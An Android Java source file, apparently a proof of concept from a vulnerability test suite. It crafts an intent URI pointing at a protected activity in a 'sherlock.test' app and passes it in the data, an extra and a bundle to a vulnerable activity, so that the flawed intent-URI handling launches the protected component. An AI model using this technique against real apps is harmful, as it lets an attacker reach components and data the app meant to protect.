package sherlock.poc.unsafe_intent_uri.component;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class BasicActivity extends AppCompatActivity {

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, BasicActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setClassName("sherlock.test", "sherlock.test.protected_components.ProtectedActivity");

        String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);

        Bundle bundle = new Bundle();
        bundle.putString("url", intentUri);

        Intent i = new Intent();
        i.setData(Uri.parse(intentUri));
        i.setClassName("sherlock.test", "sherlock.test.unsafe_intent_uri.component.BasicActivity");
        i.putExtra("url", intentUri);
        i.putExtra("bundle", bundle);
        startActivity(i);
    }
}
